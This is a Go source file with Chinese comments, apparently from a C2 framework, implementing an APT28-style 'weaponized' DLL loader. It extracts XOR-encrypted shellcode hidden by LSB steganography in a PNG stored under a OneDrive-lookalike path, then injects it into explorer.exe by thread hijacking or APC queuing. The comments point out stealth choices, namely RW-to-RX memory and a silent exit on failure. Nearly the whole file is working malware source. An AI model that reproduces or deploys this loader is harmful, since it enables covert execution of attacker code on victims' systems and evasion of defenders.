//go:build windows

// Package weaponize 提供 APT28 风格的武器化加载器。
// 功能：PNG 隐写解码 → shellcode 提取 → 进程注入。
//
// 面试要点：
// 1. 这是 APT28 EhStoreShell 的 Go 实现版本
// 2. 完整链路：读取 PNG → zlib 解压 → LSB 提取 → XOR 解密 → 注入 explorer.exe
// 3. 注入方式：Thread Hijack 或 QueueUserAPC（可配置）
package weaponize

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/aegis-c2/aegis/agent/winutil"
	"github.com/aegis-c2/aegis/shared"
)

// ===== Windows API 声明 =====

var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	procOpenProcess         = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First       = kernel32.NewProc("Thread32First")
	procThread32Next        = kernel32.NewProc("Thread32Next")
	procOpenThread          = kernel32.NewProc("OpenThread")
	procSuspendThread       = kernel32.NewProc("SuspendThread")
	procResumeThread        = kernel32.NewProc("ResumeThread")
	procGetThreadContext    = kernel32.NewProc("GetThreadContext")
	procSetThreadContext    = kernel32.NewProc("SetThreadContext")
	procQueueUserAPC        = kernel32.NewProc("QueueUserAPC")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

// Windows 常量
const (
	PROCESS_ALL_ACCESS     = 0x001F0FFF
	THREAD_ALL_ACCESS      = 0x001F03FF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	TH32CS_SNAPTHREAD      = 0x00000004
	INFINITE               = 0xFFFFFFFF
)

// THREADENTRY32 结构体
type THREADENTRY32 struct {
	Size           uint32
	CntUsage       uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePri        int32
	DeltaPri       int32
	Flags          uint32
}

// CONTEXT 结构体（x64 简化版，只含我们需要使用的寄存器）
// 完整 CONTEXT 有 1232 字节，我们只关心 Rcx/Rdx/Rsp/Rip
type CONTEXT_x64 struct {
	P1Home         uint64
	P2Home         uint64
	P3Home         uint64
	P4Home         uint64
	P5Home         uint64
	P6Home         uint64
	ContextFlags   uint32
	MxCsr          uint32
	SegCs          uint16
	SegDs          uint16
	SegEs          uint16
	SegFs          uint16
	SegGs          uint16
	SegSs          uint16
	EFlags         uint32
	Dr0            uint64
	Dr1            uint64
	Dr2            uint64
	Dr3            uint64
	Dr6            uint64
	Dr7            uint64
	EffectiveSize  uint64
	_              uint64 // 对齐
	Xmm0           [16]byte
	Xmm1           [16]byte
	Xmm2           [16]byte
	Xmm3           [16]byte
	Xmm4           [16]byte
	Xmm5           [16]byte
	Xmm6           [16]byte
	Xmm7           [16]byte
	Xmm8           [16]byte
	Xmm9           [16]byte
	Xmm10          [16]byte
	Xmm11          [16]byte
	Xmm12          [16]byte
	Xmm13          [16]byte
	Xmm14          [16]byte
	Xmm15          [16]byte
	_              [96]byte  // VectorRegister
	VectorControl uint64
	DebugControl  uint64
	LastBranchToRip uint64
	LastBranchFromRip uint64
	LastExceptionToRip uint64
	LastExceptionFromRip uint64
	// 以下是一般寄存器，偏移量必须匹配 Windows CONTEXT
	Rax uint64
	Rcx uint64
	Rdx uint64
	Rbx uint64
	Rsp uint64
	Rbp uint64
	Rsi uint64
	Rdi uint64
	R8  uint64
	R9  uint64
	R10 uint64
	R11 uint64
	R12 uint64
	R13 uint64
	R14 uint64
	R15 uint64
	Rip uint64
}

// CONTEXT 标志
const (
	CONTEXT_AMD64  = 0x100000
	CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1
	CONTEXT_INTEGER = CONTEXT_AMD64 | 0x2
	CONTEXT_FULL   = CONTEXT_CONTROL | CONTEXT_INTEGER
)

// Loader 配置。
type Config struct {
	PNGPath      string // PNG 隐写文件路径
	XORKey       []byte // XOR 解密密钥
	InjectTarget string // 注入目标进程名（默认 explorer.exe）
	InjectMethod string // 注入方法：thread_hijack 或 apc
}

// DefaultConfig 返回默认配置。
func DefaultConfig() *Config {
	return &Config{
		PNGPath:      `C:\ProgramData\Microsoft OneDrive\setup\Cache\SplashScreen.png`,
		XORKey:       []byte{0x3A, 0xF1, 0x8C, 0x22, 0x77, 0xE4},
		InjectTarget: "explorer.exe",
		InjectMethod: "thread_hijack",
	}
}

// Run 执行完整武器化链路。
func Run(cfg *Config) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("weaponize only supported on Windows")
	}

	// Step 1: 读取 PNG 文件
	pngData, err := os.ReadFile(cfg.PNGPath)
	if err != nil {
		return fmt.Errorf("read png: %w", err)
	}

	// Step 2: 提取 shellcode
	shellcode, err := extractShellcode(pngData, cfg.XORKey)
	if err != nil {
		return fmt.Errorf("extract shellcode: %w", err)
	}

	// Step 3: 注入目标进程
	return injectShellcode(shellcode, cfg)
}

// extractShellcode 从 PNG 隐写文件中提取 shellcode。
func extractShellcode(pngData []byte, xorKey []byte) ([]byte, error) {
	if len(pngData) < 8 {
		return nil, fmt.Errorf("png data too short")
	}

	// 1. 提取外层 XOR 密钥
	outerKey := pngData[:8]
	pngData = pngData[8:]

	// 2. 解密外层 XOR
	pngData = shared.XORBytes(pngData, outerKey)

	// 3. 验证 PNG 签名
	if len(pngData) < 8 || !bytes.Equal(pngData[:8], []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}) {
		return nil, fmt.Errorf("invalid PNG signature")
	}

	// 4. 解析 PNG chunks，提取 IDAT 数据
	idatData, err := shared.ExtractIDAT(pngData)
	if err != nil {
		return nil, err
	}

	// 5. zlib 解压
	reader, err := zlib.NewReader(bytes.NewReader(idatData))
	if err != nil {
		return nil, fmt.Errorf("zlib decompress: %w", err)
	}
	defer reader.Close()

	pixels, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("read pixels: %w", err)
	}

	// 6. 提取 LSB 比特流
	bits := shared.ExtractLSB(pixels, shared.ReadPNGWidth(pngData))

	// 7. 重组字节
	encrypted := shared.BitsToBytes(bits)

	// 8. 先 XOR 解密整体（长度头 + shellcode），再读长度
	decrypted := shared.XORBytes(encrypted, xorKey)
	if len(decrypted) < 4 {
		return nil, fmt.Errorf("decrypted payload too short")
	}

	scLen := binary.BigEndian.Uint32(decrypted[:4])
	if int(scLen) > len(decrypted)-4 {
		return nil, fmt.Errorf("shellcode length mismatch: header says %d, have %d bytes", scLen, len(decrypted)-4)
	}

	return decrypted[4 : 4+scLen], nil
}

// ============================================================
// 进程枚举 — CreateToolhelp32Snapshot + Process32First/Next
// ============================================================

// findProcessByName 通过进程名查找 PID。
func findProcessByName(name string) (uint32, error) {
	snapshot, err := winutil.CreateToolhelp32Snapshot()
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer syscall.CloseHandle(snapshot)

	var pe winutil.PROCESSENTRY32
	if err := winutil.Process32First(snapshot, &pe); err != nil {
		return 0, fmt.Errorf("Process32First failed")
	}

	for {
		exeName := syscall.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(exeName, name) {
			return pe.Th32ProcessID, nil
		}
		if err := winutil.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %q not found", name)
}

// findThreadsOfProcess 查找指定进程的所有线程 ID。
func findThreadsOfProcess(pid uint32) ([]uint32, error) {
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot(THREAD) failed: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snapshot))

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	var threads []uint32

	ret, _, _ := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Thread32First failed")
	}

	for {
		if entry.OwnerProcessID == pid {
			threads = append(threads, entry.ThreadID)
		}

		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	if len(threads) == 0 {
		return nil, fmt.Errorf("no threads found for pid %d", pid)
	}
	return threads, nil
}

// ============================================================
// 进程注入 — Thread Hijack
// ============================================================

// injectViaThreadHijack 使用线程劫持注入 shellcode。
// 流程：OpenProcess → VirtualAllocEx(RW) → WriteProcessMemory →
//
//	VirtualProtectEx(RW→RX) → 找线程 → SuspendThread →
//	GetThreadContext → 修改 Rip → SetThreadContext → ResumeThread
func injectViaThreadHijack(pid uint32, shellcode []byte) error {
	// 1. 打开目标进程
	hProcess, err := openProcess(pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(hProcess))

	// 2. 分配 RW 内存
	remoteAddr, err := virtualAllocEx(hProcess, len(shellcode))
	if err != nil {
		return fmt.Errorf("VirtualAllocEx: %w", err)
	}

	// 3. 写入 shellcode
	if err := writeProcessMemory(hProcess, remoteAddr, shellcode); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// 4. 转换为 RX 内存（关键隐蔽点：避免 PAGE_EXECUTE_READWRITE）
	if err := virtualProtectEx(hProcess, remoteAddr, len(shellcode)); err != nil {
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}

	// 5. 查找目标进程的第一个线程
	threads, err := findThreadsOfProcess(pid)
	if err != nil {
		return fmt.Errorf("find threads: %w", err)
	}
	threadID := threads[0]

	// 6. 打开线程
	hThread, err := openThread(threadID)
	if err != nil {
		return fmt.Errorf("OpenThread: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(hThread))

	// 7. 挂起线程
	_, _, err = procSuspendThread.Call(uintptr(hThread))
	if err != nil && err.Error() != "" {
		// SuspendThread 返回 -1 表示失败，但 err 可能为空
	}

	// 8. 获取线程上下文
	ctx := &CONTEXT_x64{}
	ctx.ContextFlags = CONTEXT_FULL
	ret, _, err := procGetThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(ctx)))
	if ret == 0 {
		procResumeThread.Call(uintptr(hThread))
		return fmt.Errorf("GetThreadContext: %w", err)
	}

	// 9. 修改 Rip 指向 shellcode
	ctx.Rip = uint64(remoteAddr)

	// 10. 设置线程上下文
	ret, _, err = procSetThreadContext.Call(uintptr(hThread), uintptr(unsafe.Pointer(ctx)))
	if ret == 0 {
		procResumeThread.Call(uintptr(hThread))
		return fmt.Errorf("SetThreadContext: %w", err)
	}

	// 11. 恢复线程执行
	_, _, _ = procResumeThread.Call(uintptr(hThread))

	return nil
}

// ============================================================
// 进程注入 — APC (Asynchronous Procedure Call)
// ============================================================

// injectViaAPC 使用 APC 注入 shellcode。
// 流程：OpenProcess → VirtualAllocEx(RW) → WriteProcessMemory →
//
//	VirtualProtectEx(RW→RX) → 枚举所有线程 →
//	QueueUserAPC(shellcode_addr, hThread, 0)
func injectViaAPC(pid uint32, shellcode []byte) error {
	// 1. 打开目标进程
	hProcess, err := openProcess(pid)
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(hProcess))

	// 2. 分配 RW 内存
	remoteAddr, err := virtualAllocEx(hProcess, len(shellcode))
	if err != nil {
		return fmt.Errorf("VirtualAllocEx: %w", err)
	}

	// 3. 写入 shellcode
	if err := writeProcessMemory(hProcess, remoteAddr, shellcode); err != nil {
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	// 4. 转换为 RX 内存
	if err := virtualProtectEx(hProcess, remoteAddr, len(shellcode)); err != nil {
		return fmt.Errorf("VirtualProtectEx: %w", err)
	}

	// 5. 枚举所有线程
	threads, err := findThreadsOfProcess(pid)
	if err != nil {
		return fmt.Errorf("find threads: %w", err)
	}

	// 6. 向每个线程 Queue APC
	applied := false
	for _, threadID := range threads {
		hThread, err := openThread(threadID)
		if err != nil {
			continue
		}

		ret, _, _ := procQueueUserAPC.Call(remoteAddr, uintptr(hThread), 0)
		syscall.CloseHandle(syscall.Handle(hThread))

		if ret != 0 {
			applied = true
			break // 成功向一个线程排队 APC 即可
		}
	}

	if !applied {
		return fmt.Errorf("QueueUserAPC failed for all threads")
	}

	return nil
}

// ============================================================
// Windows API 封装
// ============================================================

func openProcess(pid uint32) (uint32, error) {
	ret, _, err := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		uintptr(0), // bInheritHandle
		uintptr(pid),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	return uint32(ret), nil
}

func virtualAllocEx(hProcess uint32, size int) (uintptr, error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,                     // lpAddress = NULL
		uintptr(size),         // dwSize
		MEM_COMMIT|MEM_RESERVE, // flAllocationType
		PAGE_READWRITE,        // flProtect (先 RW，后改 RX)
	)
	if ret == 0 {
		return 0, fmt.Errorf("VirtualAllocEx(%d bytes): %w", size, err)
	}
	return uintptr(ret), nil
}

func writeProcessMemory(hProcess uint32, addr uintptr, data []byte) error {
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory(%d bytes): %w", len(data), err)
	}
	if int(written) != len(data) {
		return fmt.Errorf("WriteProcessMemory: wrote %d of %d bytes", written, len(data))
	}
	return nil
}

func virtualProtectEx(hProcess uint32, addr uintptr, size int) error {
	var oldProtect uintptr
	ret, _, err := procVirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(size),
		PAGE_EXECUTE_READ, // RW → RX 转换（关键隐蔽点）
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtectEx(RW→RX): %w", err)
	}
	return nil
}

func openThread(threadID uint32) (uint32, error) {
	ret, _, err := procOpenThread.Call(
		uintptr(THREAD_ALL_ACCESS),
		uintptr(0), // bInheritHandle
		uintptr(threadID),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenThread(%d): %w", threadID, err)
	}
	return uint32(ret), nil
}

// injectShellcode 将 shellcode 注入目标进程。
func injectShellcode(shellcode []byte, cfg *Config) error {
	// 查找目标进程 PID
	pid, err := findProcessByName(cfg.InjectTarget)
	if err != nil {
		return fmt.Errorf("find target process: %w", err)
	}

	switch cfg.InjectMethod {
	case "apc":
		return injectViaAPC(pid, shellcode)
	default:
		return injectViaThreadHijack(pid, shellcode)
	}
}

// EntryPoint 是 DLL 入口点（通过 c-shared 编译模式导出）。
// 编译命令: go build -buildmode=c-shared -o EhStoreShell.dll
// 调用方式: rundll32.exe EhStoreShell.dll,EntryPoint
//
//export EntryPoint
func EntryPoint() {
	cfg := DefaultConfig()
	if err := Run(cfg); err != nil {
		// 失败时静默退出（隐蔽性）
		_ = err
	}
}

// Dummy main 用于编译。
func main() {}
